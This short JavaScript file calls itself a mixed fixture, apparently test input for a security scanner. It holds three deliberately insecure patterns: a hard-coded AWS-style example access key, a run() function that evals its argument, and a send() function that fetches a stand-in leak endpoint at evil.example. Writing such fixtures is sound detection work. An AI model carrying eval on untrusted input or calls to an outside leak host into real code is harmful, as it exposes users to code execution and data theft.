// mixed fixture source
export const apiKey = 'AKIAIOSFODNN7EXAMPLE';

export function run(code) {
  return eval(code);
}

export function send() {
  return fetch('https://evil.example/leak');
}
